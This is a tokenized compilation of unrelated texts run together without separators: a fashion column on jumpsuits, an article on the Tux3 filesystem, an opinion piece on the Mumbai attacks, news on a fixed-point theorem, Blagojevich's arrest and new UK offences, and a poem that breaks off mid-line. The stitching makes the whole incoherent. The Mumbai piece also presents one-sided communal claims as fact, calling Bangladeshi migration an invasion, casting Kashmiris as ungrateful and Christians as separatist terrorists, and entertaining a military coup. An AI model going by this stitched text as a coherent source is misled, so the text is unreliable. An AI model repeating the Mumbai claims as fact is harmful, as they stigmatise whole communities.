But with the recent failure of one major HIV vaccine trial and the cancellation of another , researchers are in a soul - searching mood , says Philip Goulder , an immunologist at the University of Oxford .
“ I think the field as a whole has been taking a step back and thinking we need some different ideas all together , ” he says .
And while an expensive therapy that involves genetically engineering cells from a patient then re-injecting them back may never be feasible in sub-Saharan Africa , the approach could help researchers come up with more effective vaccines and therapeutics , Goulder says .

' There 's a difference between being fashionable and looking attractive .
I just do n't think one can do ' attractive ' in a skin - tight knitted jumpsuit , " said a concerned colleague and friend .
I had been dithering over what to wear on an important night out , wavering on the Topshop website between their just - arrived wool all - in - one by Louise Goldin ( " a statement piece " , so they claim ) and a plain black dress with a frilly lace skirt .
In the end , I was so anxious at the prospect of not looking attractive that I wore the black dress , and felt distinctly un-statement .
But after my aforementioned colleague had thrown down this sartorial gauntlet , I became obsessed with proving her wrong , with finding that fashion Holy Grail in which " directional " and " attractive " need not necessarily be mutually exclusive concepts .
And I was convinced that these two polar opposites could find their equilibrium in the humble jumpsuit .

They 've been lurking on catwalks and in stores for a couple of seasons now , and show no signs of fading away .
Various incarnations in the autumn collections ranged from slouchy , fine knits at Halston and Stella McCartney , to super - tight body con at Louise Goldin , and to sleek , evening silk at Preen and Missoni .
And their presence in spring / summer is not to be sniffed at either : jumpsuits are there in full - length glory , and their shorter cousin , the unfortunately named " playsuit " , is also an ubiquitous trend .
With a revival now in full swing , it 's time to embrace the onesie as a multi-faceted and multi-functional part of your wardrobe .
I wore a jumpsuit earlier this year , some may say incongruously , for a pleasant weekend in the country .
It was a grey jersey number , sleeveless , with a hood and elasticated ankles .
The more unkind among our gathering likened it to a baby - gro , but there were some others whose minds I changed that day .
Of their many plus points , all - in - ones have the simplicity of a dress in that , once it 's on , you 're ready to go .
I have long lamented the difficulties of matching tops and skirts , and oft sought the elusive T - shirt that is long enough to wear with jeans and not show your derriere when bending over , so it 's a relief to discover a comfortable , casual alternative that one can step into and look instantly chic .
You do n't have to fuss around with tights or worry about flashing your pants when sitting down , but you 're working enough of a statement ( that word again ) look .
You also benefit from the warmth and practicality of wearing sensible trousers with pockets , but without either the formality of smart strides or the jogging bottoms danger of casual ones .
The grey flannel suit was unique among my extensive back - catalogue of trying too hard to be trendy in that , while wearing it , I felt at once smugly on - trend and refreshingly off - duty .
Having raised all of these points , and more , in defence of the jumpsuit to my sceptical colleagues and friends , I remained convinced that they would all be converts to the cause if they 'd only remove their bodysuit blinkers .
So I chose a striking Gareth Pugh knitted all - in - one from his acclaimed autumn / winter collection .
This was an all - or - nothing assignment and one of those cutesy , " is it a dress , is it culottes " numbers just was n't going to cut it .
I needed the jumpsuit to end all jumpsuits , and I teamed it with Topshop platforms and a plain black blazer .
Jumpsuits are the sum of their accessories : they can be dressed up with heels and chunky jewellery , or made everyday by throwing a jacket or plain knit on top .
A helpful colleague zipped me in , and I emerged from our fashion cupboard feeling righteously defiant , although somewhat on display .
My boss discreetly picked up her gauntlet : " Wow , it actually looks quite good . "
Jumpsuit : one , Sceptics : nil .
After a few hours , I began to get quite hot in the suit , but put this down to the garment 's eminent practicality during cold winter months – it was like a reassuring thermal vest , but all over .
After a while though , I felt a rising sense of panic .
" I need a wee , " I whimpered .
What , after all , are colleagues for but to accompany you to the toilet and unzip not only the back of your jumpsuit , but also the zips that run from the elbows to the wrists ?
The general mistrust of the all - in - one seems to stem from their being seen as either outlandish or extreme .
Granted , these are two of Gareth Pugh 's main selling points , but if a body - stocking such as mine is too much of a leap of fashion faith , you can still pick a baggy all - in - one in a muted colour .
Another fear is that they 're just not sexy : the directional / attractive divide .
This strikes me as further proof of a widespread male fear of women wearing overalls .
Jumpsuits are too " can do " for the pernicious anti-fashion average Joe , so they feel the need to mock .
Belt yours at the waist – turn up the legs if you think it 's too car mechanic – and it's not so very different from wearing a blouse and jeans .
But it 's much more hip , obviously .
The reactions I provoked were not as hostile or scornful as the sceptics had predicted , nor were they split along gender lines as you might have thought : sympathetic women who watched me being zipped in and out of the suit in my loo breaks sounded their approval , and even some of the previously doubtful fashion team are now thinking of investing in their own onesie .
I tried to gauge the opinions of some of my colleagues in the newsroom , but they seemed unable to vocalise their thoughts , so overwhelmed were they by the body - stocking 's all - in - one prowess .
One was rendered incapable of speech , while another felt the need to address me from behind a copy of the newspaper , in order to minimise visual distraction .
The Independent 's chef was as eager to give me his phone number as he was to dole out lasagne .
And the nice man I met at the bus stop seemed concerned with my welfare : " You look cold , " he said .
( It was true that , for all its warmth indoors , the thin layer of wool offered scant defence against the Docklands gales . )
" I can see you 're shivering .
In fact , I can see your ... "
" Yes ! " I cried .
" Thank you ! "
When the local builders called down compliments , I knew I had found fashion 's Holy Grail , where high conceptualism meets the man in the street and they shake hands : come and 'ave a go if you think you 're avant garde enough .

What 's in & out this week
IN – ringmasters
Marlene Dietrich meets Vivienne Westwood : tailcoats and knee - high boots may smack of period dramas , but we 're enjoying the smoulder and parlour - game politesse the combo conveys .
A good tailcoat nips in at the waist , elongates the torso and accentuates the curve of your back .
If full - length seems too " Mr Darcy " , there are shorter versions available – try Topshop 's £ 75 offering .
OUT – clowns
Summer 's vogue for harlequin prints and Pierrot collars was the last death rattle of frippery .
In a recession , less is more so keep frills and ruffles sophisticated , not slap - stick .
Copies of the iconic Commedia dell ' Arte dresses from Miu Miu now look tired , so pick classic silhouettes and minimal outlines to avoid the " tiers of a clown " look .
And while a wintery red nose can be cute , it should never be an accessory .
Tux3 : the other next - generation filesystem

There is a great deal of activity around Linux filesystems currently .
Of the many ongoing efforts , two receive the most attention : ext4 , the extension of ext3 expected to keep that filesystem design going for a few more years , and btrfs , which is seen by many as the long - term filesystem of the future .
But there is another project out there which is moving quickly and is worth a look : Daniel Phillips 's Tux3 filesystem .
Daniel is not a newcomer to filesystem development .
His Tux2 filesystem was announced in 2000 ; it attracted a fair amount of interest until it turned out that Network Appliance , Inc. held patents on a number of techniques used in Tux2 .
There was some talk of filing for defensive patents , and Jeff Merkey popped up for long enough to claim to have hired a patent attorney to help with the situation .
What really happened is that Tux2 simply faded from view .
Tux3 is built on some of the same ideas as Tux2 , but many of those ideas have evolved over the eight intervening years .
The new filesystem , one hopes , has changed enough to avoid the attention of NetApp , which has shown a willingness to use software patents to defend its filesystem turf .
Like any self - respecting contemporary filesystem , Tux3 is based on B - trees .
The inode table is such a tree ; each file stored within is also a B - tree of blocks .
Blocks are mapped using extents , of course - another obligatory feature for new filesystems .
Most of the expected features are present .
In many ways , Tux3 looks like yet another POSIX - style filesystem , but there are some interesting differences .
Tux3 implements transactions through a forward - logging mechanism .
A set of changes to the filesystem will be batched together into a " phase , " which is then written to the journal .
Once the phase is committed to the journal , the transaction is considered to be safely completed .
At some future time , the filesystem code will " roll up " the journal changes and write them back to the static version of the filesystem .
The logging implementation is interesting .
Tux3 uses a variant of the copy - on - write mechanism employed by Btrfs ; it will not allow any filesystem block to be overwritten in place .
So writing to a block within a file will cause a new block to be allocated , with the new data written there .
That , in turn , will require that the filesystem data structure which maps file - logical blocks to physical blocks ( the extent ) will need to be changed to reflect the new block location .
Tux3 handles this by writing the new blocks directly to their final location , then putting a " promise " to update the metadata block into the log .
At roll - up time , that promise will be fulfilled through the allocation of a new block and , if necessary , the logging of a promise to change the next - higher block in the tree .
In this way , changes to files propagate up through the filesystem one step at a time , without the need to make a recursive , all - at - once change .
The end result is that the results of a specific change can remain in the log for some time .
In Tux3 , the log can be thought of as an integral part of the filesystem 's metadata .
This is true to the point that Tux3 does n't even bother to roll up the log when the filesystem is unmounted ; it just initializes its state from the log when the next mount happens .
Among other things , Daniel says , this approach ensures that the journal recovery code will be well - tested and robust - it will be exercised at every filesystem mount .
In most filesystems , on - disk inodes are fixed - size objects .
In Tux3 , instead , their size will be variable .
Inodes are essentially containers for attributes ; in Tux3 , normal filesystem data and extended attributes are treated in almost the same way .
So an inode with more attributes will be larger .
Extended attributes are compressed through the use of an " atom table " which remaps attribute names onto small integers .
Filesystems with extended attributes tend to have large numbers of files using attributes with a small number of names , so the space savings across an entire filesystem could be significant .
Also counted among a file 's attributes are the blocks where the data is stored .
The Tux3 design envisions a number of different ways in which file blocks can be tracked .
A B - tree of extents is a common solution to this problem , but its benefits are generally seen with larger files .
For smaller files - still the majority of files on a typical Linux system - data can be stored either directly in the inode or at the other end of a simple block pointer .
Those representations are more compact for small files , and they provide quicker data access as well .
For the moment , though , only extents are implemented .
Another interesting - but unimplemented - idea for Tux3 is the concept of versioned pointers .
The btrfs filesystem implements snapshots by retaining a copy of the entire filesystem tree ; one of these copies exists for every snapshot .
The copy - on - write mechanism in btrfs ensures that those snapshots share data which has not been changed , so it is not as bad as it sounds .
Tux3 plans to take a different approach to the problem ; it will keep a single copy of the filesystem tree , but keep track of different versions of blocks ( or extents , really ) within that tree .
So the versioning information is stored in the leaves of the tree , rather than at the top .
But the versioned extents idea has been deferred for now , in favor of getting a working filesystem together .
Also removed from the initial feature list is support for subvolumes .
This feature initially seemed like an easy thing to do , but interaction with fsync ( ) proved hard .
So Daniel finally concluded that volume management was best left to volume managers and dropped the subvolume feature from Tux3 .
One feature which has never been on the list is checksumming of data .
Daniel once commented :
Having been checksumming filesystem data during continuous replication for two years now on multiple machines , and having caught exactly zero blocks of bad data passed as good in that time , I consider the spectre of disks passing bad data as good to be largely vendor FUD .
That said , checksumming will likely appear in the feature list at some point , I just consider it a decoration , not an essential feature .
Tux3 development is far from the point where the developers can worry about " decorations " ; it remains , at this point , an embryonic project being pushed by a developer with a bit of a reputation for bright ideas which never quite reach completion .
The code , thus far , has been developed in user space using FUSE .
There is , however , an in - kernel version which is now ready for further development .
According to Daniel :
The functionality we have today is roughly like a buggy Ext2 with missing features .
While it is very definitely not something you want to store your files on , this undeniably is Tux3 and demonstrates a lot of new design elements that I have described in some detail over the last few months .
The variable length inodes , the attribute packing , the btree design , the compact extent encoding and deduplication of extended attribute names are all working out really well .
The potential user community for a stripped - down ext2 with bugs is likely to be relatively small .
But the Tux3 design just might have enough to offer to make it a contender eventually .
First , though , there are a few little problems to solve .
At the top of the list , arguably , is the complete lack of locking - locking being the rocks upon which other filesystem projects have run badly aground .
The code needs some cleanups - little problems like the almost complete lack of comments and the use of macros as formal function parameters are likely to raise red flags on wider review .
Work on an fsck utility does not appear to have begun .
There has been no real benchmarking work done ; it will be interesting to see how Daniel can manage the " never overwrite a block " policy in a way which does not fragment files ( and thus hurt performance ) over time .
And so on .
That said , a lot of these problems could end up being resolved rather quickly .
Daniel has put the code out there and appears to have attracted an energetic ( if small ) community of contributors .
Tux3 represents the core of a new filesystem with some interesting ideas .
Code comments may be scarce , but Daniel - never known as a tight - lipped developer - has posted a wealth of information which can be found in the Tux3 mailing list archives .
Potential contributors should be aware of Daniel 's licensing scheme - GPLv3 with a reserved unilateral right to relicense the code to anything else - but developers who are comfortable with that are likely to find an interesting and fast - moving project to play in .
T
invasion of Mumbai
Then , as now , the rulers failed the populace .
There is an implicit contract between the rulers and the ruled :
You pay the taxes , obey the rules , and we ensure that your life , liberty and pursuit of happiness are unhindered .
India 's ruling class failed signally to honour this contract -- they never did figure out that the simple expedient of defending the Khyber and Bolan passes would be enough to save the plains , because nature had been kind enough to build the impregnable Himalayas all around India .
I have never got a satisfactory answer to the question as to why we did n't build the Great Wall of India .
The Chinese built a 1,500 - mile wall ; Indians could surely have built a 15 - mile wall and kept the marauders out .
But there was clearly a failure in leadership and in strategic thinking .
Time after time , the barbarians would pour in through the passes , march to Panipat or Tarain , and there , in a desperate last - ditch battle , the Indians would lose , again and again .
The result : Disaster .
Furthermore , there were traitors in - house , too .
They would collude with the invaders to the detriment of their fellow Indians .
Jaichand , during the second battle of Tarain in 1192 , turned the tide of the battle by allying with Mahmud of Ghori against Prithviraj Chauhan , with the result that northern India suffered 700 years of tyranny -- it was a clear tipping point .
Or take the battle of Talikota that ended the magnificent Vijayanagar empire : it was their own troops that betrayed them .
Fast forward to today .
India is under withering attack on all fronts .
To the east , there is the demographic invasion by Bangladeshis , including unhindered infiltration by terrorist elements .
The entire north - east is in danger of secession , given both the narrow and hard - to - defend ' chicken 's neck ' that connects the area to the Gangetic plain , as well as the Christian fundamentalism and terrorism that is on the verge of turning into a move to secede on religious and ethnic grounds , a la East Timor .
The northern frontier is restive , with Nepal , a former ally and buffer State transformed into hostile territory , with its porous borders turned into a way of infiltrating terrorists into India , with the declared intent of capturing the ' Pasupati - to - Tirupati corridor ' , in other words , most of the eastern half of the country .
China is making increasingly belligerent noises about Tawang and all of Arunachal Pradesh .
They are gambling that , despite the summit that just took place in Dharamsala , the steam has gone out of the Tibetan resistance movement .
They have been emboldened by the fact that Tibetans were not able to disrupt the Olympics [ Images ] , and the more immediate betrayal by the British ( see the International Herald Tribune 's Did Britain Just Sell Tibet ? ) , who declared , contrary to all the historical evidence , that Tibet [ Images ] was always a part of China .
Besides , the Chinese fully intend to move forward with the diversion of the Brahmaputra , which is in effect a declaration of war against the lower riparian State , India .
It is likely that the Chinese will march into Tawang -- there is a lot of chatter in Chinese circles ( see , an analysis by D S Rajan at the Chennai Centre for China Studies ) about a ' limited India - China war ' , a replay of 1962 .
The Chinese have , in addition to pure geopolitics , another reason to do this , as was pointed out by strategy expert Brahma Chellaney -- as in the years preceding 1962 , the world is now once again hyphenating India and China .
By handing India a sharp conventional military defeat , China would like that hyphenation to be removed decisively , as it surely would be .
India will once again be seen as the loser it has been during the entire 1947 to 2000 period .
In the northwest , Kashmir burns .
The population clearly views India as a colony -- they want Indian money , but they are not willing to make the slightest concessions to Hindu sentiments .
It is very convenient for them to have the cake and eat it too -- there is the little - known fact that J&K has practically nobody under the poverty line ( 2 percent and falling ) , as compared to the average of some 20 percent in the country as a whole .
Kashmiris have prospered mightily despite -- or is it because of ? -- the brutal ethnic cleansing of 400,000 Pandits now languishing in refugee camps .
In the traditionally quiet peninsula , there is evidence of tremendous terrorist activity .
In Kerala [ Images ] , it has been reported widely in the Malayalam media that 300 youth have been hired , trained and dispatched to Kashmir with explicit instructions -- kill Indian soldiers and support Pakistani intrusions .
Terrorism [ Images ] is just another job .
Sleeper cells exist in every town .
The Konkan and Malabar coasts are dotted with safe harbours , where weapons , counterfeit currency and contraband are cached .
The preferred mechanism -- bomb blasts to inflict maximum damage .
Logistics , safe houses , surveillance , forged documents , etc. are provided by a wide network .
The fact is that all these threats are overwhelming the security apparatus in the country , such as it is .
It is quite likely that the Intelligence Bureau and the Research and Analysis Wing and the Anti-Terrorism Squad had some inkling of something big being planned , including the movement of small arms on the Ratnagiri coastline , and the logistics - related activities of known suspects .
It is unclear why they did n't take preventive action .
There is a terrifying possibility -- that they in fact had no idea this was going on .
There is an aphorism that you cannot stop all terrorist activity , but in India the situation is such that no terrorist activity is stopped -- they strike at will , and the populace is left to pick up the pieces of broken lives .
This is no way to run a country .
The frightening possibility is that the Jaichands have in fact taken over the State .
In which case , we can anticipate the total dismemberment of India -- possibly preceded by an interregnum where it is a failed State -- in the near future .
There is one other possibility -- that the army will have to take over .
It is a remote possibility , for two reasons -- the Indian Army [ Images ] has been determinedly apolitical ; and the State has continually striven to weaken it .
Someone once made the ridiculous statement that India really did n't need an army , only a police force , and it appears the entire political class and bureaucracy have internalised this slogan .
From 1962 -- as always , on November 18 I silently saluted the martyrs of the Battle of Rezang - La , where C Company , 13th Kumaon died heroically to the last man -- when the ill - equipped troops froze to death on the Himalayan heights , to the refusal to increase military salaries when the bureaucrats awarded themselves 300 percent increases recently , the State has told the military that it does n't value them .
All the services are starved of funds .
One possible outcome is that the Indian military forces will gradually wither away and die , thus making the statement about India not needing an army a self - fulfilling prophecy .
There is another possibility -- that of a military coup d'etat .
Normally , the prospect of a military takeover -- given that they all end up badly -- from a democracy is not something one would welcome .
But then India is not a democracy -- it is a kakistocracy , rule by the very worst possible people -- which has the trappings of a democracy but not the substance , so I wonder if military rule could possibly be any worse .
But the chances are getting increasingly good that the Indian State will collapse , just like Pakistan already has .
A recent risk assessment by the World Economic Forum and CII considers the economic , energy , food / agriculture and national security that face India .
The report is more concerned about the first three items , assuming that India is secure enough as a nation .
I hope they are right , but this invasion of Mumbai -- so daring and audacious -- makes me wonder .
I have considered a nightmare scenario of Chinese battleships arriving in triumph at the Gateway of India [ Images ] , to be welcomed with marigold garlands by the Jaichands , but I have to admit I never thought a motley crew of Pakistani terrorists would invade .
The very future of the Indian State , suddenly , is in question .
And it is mostly from self - inflicted , avoidable wounds .
The failure of leadership is causing India to cease to exist .

Newswise —
When Dr. Claudio Morales presents his findings on the Leray - Schauder condition to a regional mathematics conference later this month , it will be the culmination of work that started more than 30 years ago .
Morales presents his findings on his home turf when the southeastern section of the American Mathematical Society meets Oct. 24 -26 at The University of Alabama in Huntsville .
" Over 30 years ago I became aware of this problem when my Ph.D. advisor wrote about it , " said Morales , a professor of mathematical sciences at UAHuntsville .
He started work on the problem soon after , but really focused on it after he joined the UAHuntsville faculty .
" When I came here in 1982 I really worked hard to solve this problem , " he said .
" I never stopped working on it .
I did n't work on it constantly , but I never put it completely aside . "
Instead , Morales spent the last 26 years working on related problems in an area of mathematics known as fixed point theory on infinite dimensional vector spaces .
It was the work in related areas that ultimately led to the solution of the bigger problem .
" Suddenly I was able to put together some ideas that came from my other work , " he said .
" I realized I could apply what I was working on to my old problem .
I was extremely excited that day . "
His solution , which was published in a September edition of Proceedings of the American Mathematical Society , is sending ripples across the mathematical world .
Mathematicians from Canada , Greece and Japan may come to Huntsville to meet Morales and hear his presentation .
" This is very exciting , " he said .
Morales ' presentation is scheduled for Saturday , Oct. 25 , in a session that begins at 2:30 p.m. in room 103 of UAHuntsville 's Shelby Center for Science and Technology .
The problem posed by the University of Iowa 's William Kirk in 1975 asked whether there is a fixed point for a nonexpansive mapping defined on a closed bounded and convex set , with nonempty interior under the Leray - Schauder condition .
( The answer is : Yes . )
Although the Huntsville meeting is a regional AMS conference , the work behind the 237 scheduled presentations comes from mathematicians in 35 states , the District of Columbia and 21 countries .
( CNN ) -- Illinois Gov. Rod Blagojevich appeared in court Tuesday afternoon to hear federal corruption charges against him .
He was released on $ 4,500 bail .
Rod Blagojevich is serving his second term as governor of Illinois .
The Democratic governor , who appeared in court in a blue jogging suit , also had to forfeit his passport .
FBI agents arrested Blagojevich and his chief of staff , John Harris , early Tuesday on federal corruption charges related in part to the selection of President - elect Barack Obama 's successor to the Senate , the U.S. attorney 's office said .
U.S. Attorney Patrick Fitzgerald declared Tuesday a " sad day for government . "
" Gov. Blagojevich has taken us to a new low , " he said .
" This conduct would make [ Abraham ] Lincoln roll over in his grave . "
Lincoln was a congressman from Illinois before becoming president .
Fitzgerald said the government had bugged the governor 's campaign office and placed a tap on his home phone .
Each was charged with a count of conspiracy to commit mail and wire fraud and a count of solicitation of bribery , authorities said .
Watch : Fitzgerald discusses the charges »
In a 76 - page affidavit , federal authorities said wiretaps caught Blagojevich conspiring to sell or trade the vacant Senate seat in exchange for financial benefits for himself and his wife , Patti .
The governor also often weighed the option of appointing himself to the Senate seat , saying he was " stuck " at governor and might have access to more resources as a senator than as a governor , the affidavit says .
A Senate seat could also help him remake his image ahead of a possible presidential run in 2016 .
" If ... they 're not going to offer anything of any value , then I might just take it , " he said in one conversation .
Obama reacted at a news conference on Tuesday .

" Obviously , like the rest of the people of Illinois , I am saddened and sobered by the news that came out of the U.S. attorney 's office today , " he said .
" But as this is an ongoing investigation involving the governor , I do n't think it would be appropriate for me to comment on the issue at this time . "
When asked whether he had any contact with Blagojevich about the Senate seat , Obama said he had no contact with the governor or his office .
" I was not aware of what was happening , " he added .
At times , Blagojovich discussed obtaining a substantial salary for himself at a nonprofit organization or an organization affiliated with labor unions , as well as placing his wife on paid corporate boards where she might make as much as $ 150,000 a year , the government said .
During one recorded conversation , Blagojevich said he needed to consider his family and said he was financially hurting , the affidavit said .

" I want to make money , " Blagojevich said , according to the affidavit .
The intercepted phone calls also caught the governor and Harris discussing the possibility of the Tribune Co. 's obtaining assistance from the Illinois Finance Authority in efforts to sell the Cubs and the financing or sale of Wrigley Field , the government said .
The company owns the Chicago Tribune , the Cubs and Wrigley Field .
The Tribune Co. announced Monday that it is filing for Chapter 11 bankruptcy protection .
Blagojevich allegedly directed Harris to tell Tribune officials that state assistance would be withheld unless members of the Chicago Tribune 's editorial board were fired .
The Illinois governor saw them as " driving discussion of his possible impeachment , " the affidavit said .
" Our recommendation is fire all those [ expletive ] people , get 'em the [ expletive ] out of there and get us some editorial support , " the governor allegedly said in one phone call .
Federal authorities also allege the governor and Harris schemed with others -- including convicted real estate developer Antoin " Tony " Rezko -- to obtain financial benefits for himself , his family and others , including his campaign committee , Friends of Blagojevich .
Reports from the Chicago Tribune last week said federal authorities were investigating the governor and were secretly taping his conversations -- with the help of his former congressional chief of staff , John Wyem .
" I do n't believe there 's any cloud that hangs over me , " Blagojevich told WLS - TV in Chicago on Monday as he responded to the reports of wiretapping .
" I think there 's nothing but sunshine hanging over me . "
He added , " By the way , I should say if anyone wants to tape my conversations , go right ahead , feel free to do it .
I appreciate anybody who wants to tape me openly . "
Fitzgerald said the case required " unusual measures " because of actions Blagojevich was expected to take soon , including filling the vacant Senate seat .
" There were a lot of things going on that were imminent , " he said .
" We were in the middle of a corruption crime spree and we wanted to stop it , " Fitzgerald said .
Watch : Fitzgerald discusses Obama 's Senate seat »
One big question now is whether Blagojevich retains the right to name Obama 's successor if he remains in custody or even under indictment .
The answer is yes , according to Fitzgerald .
Jay Stewart , executive director of Chicago 's Better Government Association , agreed .
He said Blagojevich retains the right to fill the senate vacancy until he's out of office , which wo n't happen unless he quits or is removed from office by impeachment .
At a news conference Tuesday , Illinois Sen . Dick Durbin , a Democrat , said he wants the Illinois Legislature to act quickly to pass a law setting a special election to fill Obama 's seat , in order to prevent Blagojevich from making a tainted appointment or there being a lengthy vacancy in the Senate .
" No appointment by this governor under these circumstances could produce a credible replacement , " Durbin said .
iReport.com :
What do you think of Blagojevich 's corruption charges ?
Fitzgerald said Blagojevich was looking to pull $ 8 million in funding for a children 's hospital after the hospital 's chief executive officer did not give a $ 50,000 contribution to the governor 's campaign .
Also , Fitzgerald said , it was expected that Blagojevich would soon sign into law a bill that would direct a percentage of casino revenue to the horse racing industry -- a bill supported by someone who contributed $ 100,000 .
" To let that bill be signed , to me , would be very , very troubling , " Fitzgerald said .
The governor 's office , in an afternoon statement , said the allegations " do nothing to impact the services , duties or function of the state . "
" Our state will continue to ensure health , safety and economic stability for the citizens of Illinois . "
Lt. Gov. Pat Quinn said the governor should use a provision in the Illinois constitution that allows him to step down , but not necessarily to resign .
" I recommend to the governor to realize ... that he cannot carry out his responsibilities of office today , and he should , in my opinion , step aside . "
Quinn , a Democrat like Blagojevich , said under the provision , a determination can be made later as to whether he can return to office .
Quinn said he had not spoken to Blagojevich at length since summer 2007 .
Blagojevich , who turns 52 on Wednesday , is in his second four - year term as Illinois governor .
His term ends January 2011 .
Before that , he served as a U.S. congressman for Illinois ' 5th district from 1997 until 2003 , according to his online biography .
He and his wife have two daughters .
The state 's last governor , George Ryan , was convicted in April 2006 on racketeering and fraud charges .
Ryan reported to a federal prison in Wisconsin in November 2007 to serve a 6 ½ - year sentence .
Earlier this year , the Supreme Court of the United States said it would not hear an appeal from Ryan .
CNN 's Drew Griffin , Kathleen Johnston and Ed Hornick contributed to this report .

Britons are forbidden from disturbing packs of eggs and from selling game killed on a Sunday , it was revealed this week by an opposition MP who condemned ministers for introducing ridiculous laws .
The day after Prime Minister Gordon Brown ’s government laid out its legislative agenda for the coming year , Liberal Democrat lawmaker Chris Huhne noted the stream of sometimes “ completely bizarre ” new offences it had created .
Since the Labour party took power in 1997 under then - prime minister Tony Blair , it has created 3 600 new criminal offences , Huhne said — adding this was “ massively complicating ” the job of police and the criminal justice system .
“ Some of these offences are completely bizarre — for example , the offence of causing a nuclear explosion , ” he told MPs .
“ The idea that anyone might cause a nuclear explosion without killing anybody , and therefore being subject to a possible charge of murder , is extremely far - fetched . ”
Other new offences include “ wilfully pretending to be a barrister ” , “ disturbing a pack of eggs when instructed not to by an authorised officer ” and “ offering for sale a game bird killed on a Sunday or Christmas day ” , he said .
Huhne accused the government of doing nothing to repeal these laws .
Justice minister Jack Straw asked for a full list of the ones the MP wanted removed from the statute books so that he could review them .

Impossible To Tell
to Robert Hass and in memory of Elliot Gilbert
Slow dulcimer , gavotte and bow , in autumn ,
Bash › and his friends go out to view the moon ;
In summer , gasoline rainbow in the gutter ,
The secret courtesy that courses like ichor
Through the old form of the rude , full - scale joke ,
Impossible to tell in writing .
" Bash › "
He named himself , " Banana Tree " : banana
After the plant some grateful students gave him ,
Maybe in appreciation of his guidance
Threading a long night through the rules and channels
Of their collaborative linking - poem
Scored in their teacher 's heart : live , rigid , fluid
Like passages etched in a microscopic cicuit .
Elliot had in his memory so many jokes
They seemed to breed like microbes in a culture
Inside his brain , one so much making another
It was impossible to tell them all :
In the court - culture of jokes , a top banana .
Imagine a court of one : the queen a young mother ,
Unhappy , alone all day with her firstborn child
And her new baby in a squalid apartment
Of too few rooms , a different race from her neighbors .
She tells the child she 's going to kill herself .
She broods , she rages .
Hoping to distract her ,
The child cuts capers , he sings , he does imitations
Of different people in the building , he jokes ,
He feels if he keeps her alive until the father
Gets home from work , they 'll be okay till morning .
It 's laughter versus the bedroom and the pills .
What is he in his efforts but a courtier ?
Impossible to tell his whole delusion .
In the first months when I had moved back East
From California and had to leave a message
On Bob 's machine , I used to make a habit
Of telling the tape a joke ; and part - way through ,
I would pretend that I forgot the punchline ,
Or make believe that I was interrupted —
As though he'd be so eager to hear the end
He 'd have to call me back .
The joke was Elliot's ,
More often than not .
The doctors made the blunder
That killed him some time later that same year .
One day when I got home I found a message
On my machine from Bob .
He had a story
About two rabbis , one of them tall , one short ,
One day while walking along the street together
They see the corpse of a Chinese man before them ,
And Bob said , sorry , he forgot the rest .
Of course he thought that his joke was a dummy ,
Impossible to tell — a dead - end challenge .
But here it is , as Elliot told it to me :
The dead man 's widow came to the rabbis weeping ,
Begging them , if they could , to resurrect him .
Shocked , the tall rabbi said absolutely not .
But the short rabbi told her to bring the body
Into the study house , and ordered the shutters
Closed so the room was night - dark .
Then he prayed
Over the body , chanting a secret blessing
Out of Kabala .
" Arise and breathe , " he shouted ;
But nothing happened .
The body lay still .
So then
The little rabbi called for hundreds of candles
And danced around the body , chanting and praying
In Hebrew , then Yiddish , then Aramaic .
He prayed
In Turkish and Egyptian and Old Galician
For nearly three hours , leaping about the coffin
In the candlelight so that his tiny black shoes
Seemed not to touch the floor .
With one last prayer
Sobbed in the Spanish of before the Inquisition
He stopped , exhausted , and looked in the dead man 's face .
Panting , he raised both arms in a mystic gesture
And said , " Arise and breathe ! "
And still the body
Lay as before .
Impossible to tell
In words how Elliot 's eyebrows flailed and snorted
Like shaggy mammoths as — the Chinese widow
Granting permission — the little rabbi sang
The blessing for performing a circumcision
And removed the dead man 's foreskin , chanting blessings
In Finnish and Swahili , and bathed the corpse
From head to foot , and with a final prayer
In Babylonian , gasping with exhaustion ,
He seized the dead man 's head and kissed the lips
And dropped it again and leaping back commanded ,
" Arise and breathe ! "
The corpse lay still as ever .
At this , as when Bash › 's disciples wind
Along the curving spine that links the renga
Across the different voices , each one adding
A transformation according to the rules
Of stasis and repetition , all in order
And yet impossible to tell beforehand ,
Elliot changes for the punchline : the wee
Rabbi , still panting , like a startled boxer ,
Looks at the dead one , then up at all those watching ,
A kind of Mel Brooks gesture : " Hoo boy ! " he says ,
" Now that 's what I call really dead . "
O mortal
Powers and princes of earth , and you immortal
Lords of the underground and afterlife ,
Jehovah , Raa , Bol - Morah , Hecate , Pluto ,
What has a brilliant , living soul to do with
Your harps and fires and boats , your bric - a- brac
And troughs of smoking blood ?
Provincial stinkers ,
Our languages do n't touch you , you 're like that mother
Whose small child entertained her to beg her life .
Possibly he grew up to be the tall rabbi ,
The one who washed his hands of all those capers
Right at the outset .
Or maybe he became
The author of these lines , a one - man renga
The one for whom it seems to be impossible
To tell a story straight .
It was a routine
Procedure .
When it was finished the physicians
Told Sandra and the kids it had succeeded ,
But Elliot would n't wake up for maybe an hour ,
They should go eat .
The two of them loved to bicker
In a way that on his side went back to Yiddish ,
On Sandra 's to some Sicilian dialect .
He used to scold her endlessly for smoking .
When she got back from dinner with their children
The doctors had to tell them about the mistake .
Oh swirling petals , falling leaves !
The movement
Of linking renga coursing from moment to moment
Is meaning , Bob says in his Haiku book .
Oh swirling petals , all living things are contingent ,
Falling leaves , and transient , and they suffer .
But the Universal is the goal of jokes ,
Especially certain ethnic jokes , which taper
Down through the swirling funnel of tongues and gestures
Toward their preposterous Ithaca .
There 's one
A journalist told me .
He heard it while a hero
Of the South African freedom movement was speaking
To elderly Jews .
The speaker 's own right arm
Had been blown off by right - wing letter - bombers .
He told his listeners they had to cast their ballots
For the ANC — a group the old Jews feared
As " in with the Arabs . "
But they started weeping
As the old one - armed fighter told them their country
Needed them to vote for what was right , their vote
Could make a country their children could return to
From London and Chicago .
The moved old people
Applauded wildly , and the speaker 's friend
Whispered to the journalist , " It 's the Belgian Army
Joke come to life . "
I wish I could tell it
To Elliot .
In the Belgian Army , the feud
Between the Flemings and Walloons grew vicious ,
So out of hand the army could barely function .
Finally one commander assembled his men
In one great room , to deal with things directly .
They stood before him at attention .
" All Flemings , "
He ordered , " to the left wall . "
Half the men
Clustered to the left .
" Now all Walloons , " he ordered ,
" Move to the right . "
An equal number crowded
Against the right wall .
Only one man remained
At attention in the middle : " What are you , soldier ? "
Saluting , the man said , " Sir , I am a Belgian . "
" Why , that 's astonishing , Corporal — what 's your name ? "
Saluting again , " Rabinowitz , " he answered :
A joke that seems at first to be a story
About the Jews .
But as the renga describes
Religious meaning by moving in drifting petals
And brittle leaves that touch and die and suffer
The changing winds that riffle the gutter swirl ,
So in the joke , just under the raucous music
